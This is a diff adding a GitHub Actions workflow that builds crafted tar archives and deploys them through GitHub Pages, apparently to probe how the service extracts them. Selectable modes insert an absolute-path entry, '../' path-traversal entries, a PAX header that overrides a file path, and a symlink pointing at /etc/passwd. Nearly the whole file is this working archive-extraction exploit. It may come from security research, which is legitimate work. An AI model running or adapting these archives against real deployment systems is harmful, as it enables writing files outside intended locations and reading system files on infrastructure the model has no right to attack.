@@ -1,0 +1,63 @@
+name: Crafted tar probe 5 (gzip correct)
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'ctrl | abs | trav | pax | sym | dotdot4'
+        required: true
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Craft GZIPPED tar by mode
+        run: |
+          python3 - <<'PY'
+          import tarfile, time, io, os
+          mode = os.environ['MODE']
+          ts = int(time.time())
+          fmt = tarfile.PAX_FORMAT if mode == 'pax' else tarfile.GNU_FORMAT
+          t = tarfile.open('artifact.tar', 'w:gz', format=fmt)
+          def addfile(name, data=b'', symlink=None, pax=None):
+              ti = tarfile.TarInfo(name)
+              if symlink is not None:
+                  ti.type = tarfile.SYMTYPE
+                  ti.linkname = symlink
+                  ti.mode = 0o777
+                  t.addfile(ti)
+              else:
+                  ti.size = len(data)
+                  ti.mode = 0o644
+                  if pax: ti.pax_headers = pax
+                  t.addfile(ti, io.BytesIO(data))
+          addfile('index.html', ('<!DOCTYPE html><html><body><h1>craft5 %s %d</h1></body></html>' % (mode, ts)).encode())
+          if mode == 'abs':
+              addfile('/abs5-%d.html' % ts, b'<!DOCTYPE html><h1>ABS5</h1>')
+          elif mode == 'trav':
+              addfile('trav5/../../observable-trav5-%d.html' % ts, b'<!DOCTYPE html><h1>TRAV5</h1>')
+          elif mode == 'dotdot4':
+              addfile('d/e/f/g/../../../../up5-%d.html' % ts, b'<!DOCTYPE html><h1>UP5</h1>')
+          elif mode == 'pax':
+              addfile('benign5-%d.html' % ts, b'<!DOCTYPE html><h1>PAXOVERRIDE5</h1>', pax={'path': 'pax-override5-%d.html' % ts})
+          elif mode == 'sym':
+              addfile('sym_abs5.html', symlink='/etc/passwd')
+          t.close()
+          print('mode', mode, 'ts', ts)
+          PY
+          env:
+            MODE: ${{ inputs.mode }}
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - uses: actions/deploy-pages@v4
+        id: deployment
